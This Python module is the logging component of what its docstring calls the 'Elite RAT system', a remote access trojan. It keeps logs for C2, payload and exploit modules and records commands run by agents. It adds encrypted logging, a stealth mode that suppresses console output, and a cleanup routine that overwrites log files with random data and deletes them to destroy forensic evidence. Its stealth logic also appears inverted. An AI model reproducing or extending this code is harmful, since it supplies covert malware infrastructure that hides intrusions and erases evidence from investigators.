#!/usr/bin/env python3
"""
Central Logging System with Encryption and Stealth
"""

import os
import sys
import logging
import logging.handlers
import json
import time
import hashlib
import base64
from datetime import datetime
from pathlib import Path
from typing import Optional
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from Core.config_loader import config

class EncryptedFormatter(logging.Formatter):
    """Custom formatter that encrypts sensitive data"""
    
    def __init__(self, *args, encrypt_logs=False, **kwargs):
        super().__init__(*args, **kwargs)
        self.encrypt_logs = encrypt_logs
        self.cipher = None
        
        if self.encrypt_logs:
            # Generate encryption key from config
            password = config.get('webapp.secret_key', 'CHANGE_THIS_SECRET_KEY').encode()
            salt = b'elite_logger_salt'  # In production, use random salt
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            self.cipher = Fernet(key)
    
    def format(self, record):
        # Format the message
        msg = super().format(record)
        
        # Encrypt if needed
        if self.encrypt_logs and self.cipher:
            encrypted = self.cipher.encrypt(msg.encode())
            return base64.b64encode(encrypted).decode()
        
        return msg

class StealthHandler(logging.Handler):
    """Handler that suppresses output in stealth mode"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stealth_mode = config.get('stealth.hide_console', False)
        self.buffer = []
        
    def emit(self, record):
        if self.stealth_mode:
            # Store in memory instead of outputting
            self.buffer.append(self.format(record))
            # Keep buffer size limited
            if len(self.buffer) > 1000:
                self.buffer = self.buffer[-500:]
        else:
            # Normal output
            sys.stderr.write(self.format(record) + '\n')
            sys.stderr.flush()

class EliteLogger:
    """
    Central logger for the entire Elite RAT system
    Handles encryption, rotation, and stealth
    """
    
    _instance = None
    _loggers = {}
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not hasattr(self, 'initialized'):
            self.initialized = True
            self.setup_logging()
    
    def setup_logging(self):
        """Setup the logging system based on config"""
        
        # Create logs directory
        log_dir = Path(config.get('logging.dir', '/workspace/logs/'))
        log_dir.mkdir(parents=True, exist_ok=True)
        
        # Get config values
        log_level = getattr(logging, config.get('logging.level', 'INFO'))
        max_size = config.get('logging.max_size', 10485760)  # 10MB
        backup_count = config.get('logging.backup_count', 5)
        encrypt_logs = config.get('logging.encrypt_logs', False)
        console_output = config.get('logging.console_output', False)
        
        # Create root logger
        self.root_logger = logging.getLogger('elite')
        self.root_logger.setLevel(log_level)
        self.root_logger.handlers.clear()
        
        # File handler with rotation
        file_handler = logging.handlers.RotatingFileHandler(
            log_dir / 'elite.log',
            maxBytes=max_size,
            backupCount=backup_count
        )
        
        # Set formatter with encryption if needed
        formatter = EncryptedFormatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            encrypt_logs=encrypt_logs
        )
        file_handler.setFormatter(formatter)
        self.root_logger.addHandler(file_handler)
        
        # Console handler (respects stealth mode)
        if console_output and not config.get('stealth.hide_console', False):
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(formatter)
            self.root_logger.addHandler(console_handler)
        elif not config.get('stealth.hide_console', False):
            # Use stealth handler that buffers instead of printing
            stealth_handler = StealthHandler()
            stealth_handler.setFormatter(formatter)
            self.root_logger.addHandler(stealth_handler)
    
    def get_logger(self, name: str) -> logging.Logger:
        """Get or create a named logger"""
        
        if name not in self._loggers:
            # Create child logger
            logger = logging.getLogger(f'elite.{name}')
            self._loggers[name] = logger
            
            # Create separate file for this module if needed
            if name in ['c2', 'webapp', 'payload', 'exploit']:
                log_dir = Path(config.get('logging.dir', '/workspace/logs/'))
                handler = logging.handlers.RotatingFileHandler(
                    log_dir / f'{name}.log',
                    maxBytes=config.get('logging.max_size', 10485760),
                    backupCount=config.get('logging.backup_count', 5)
                )
                
                formatter = EncryptedFormatter(
                    f'%(asctime)s - {name} - %(levelname)s - %(message)s',
                    encrypt_logs=config.get('logging.encrypt_logs', False)
                )
                handler.setFormatter(formatter)
                logger.addHandler(handler)
        
        return self._loggers[name]
    
    def log_command(self, agent_id: str, command: str, result: str = None):
        """Special logging for commands with audit trail"""
        
        audit_logger = self.get_logger('audit')
        
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'agent_id': agent_id,
            'command': command,
            'result': result[:500] if result else None,  # Limit result size
            'user': os.getenv('USER', 'unknown')
        }
        
        audit_logger.info(json.dumps(log_entry))
    
    def clear_logs(self):
        """Clear all log files (for cleanup)"""
        
        if config.get('stealth.clear_logs_on_exit', False):
            log_dir = Path(config.get('logging.dir', '/workspace/logs/'))
            
            for log_file in log_dir.glob('*.log*'):
                try:
                    # Overwrite with random data before deletion
                    size = log_file.stat().st_size
                    with open(log_file, 'wb') as f:
                        f.write(os.urandom(size))
                    log_file.unlink()
                except:
                    pass
    
    def get_buffered_logs(self) -> list:
        """Get logs from stealth buffer"""
        
        for handler in self.root_logger.handlers:
            if isinstance(handler, StealthHandler):
                return handler.buffer
        return []

# Global logger instance
logger_system = EliteLogger()

# Convenience function
def get_logger(name: str = 'default') -> logging.Logger:
    """Get a logger instance"""
    return logger_system.get_logger(name)

# Test the logger
if __name__ == "__main__":
    print("Testing Elite Logger System")
    print("-" * 50)
    
    # Test basic logging
    log = get_logger('test')
    log.info("Test info message")
    log.warning("Test warning message")
    log.error("Test error message")
    
    # Test audit logging
    logger_system.log_command('agent_123', 'whoami', 'root')
    
    # Test module-specific logger
    c2_log = get_logger('c2')
    c2_log.info("C2 server started")
    
    webapp_log = get_logger('webapp')
    webapp_log.info("Web application initialized")
    
    # Check if logs were created
    log_dir = Path(config.get('logging.dir', '/workspace/logs/'))
    log_files = list(log_dir.glob('*.log'))
    
    print(f"\n✅ Created {len(log_files)} log files:")
    for log_file in log_files:
        size = log_file.stat().st_size
        print(f"  - {log_file.name}: {size} bytes")
    
    # Test stealth buffer
    if config.get('stealth.hide_console', False):
        buffered = logger_system.get_buffered_logs()
        print(f"\n📝 Buffered logs in stealth mode: {len(buffered)} entries")
    
    print("\n✅ Logger system working correctly!")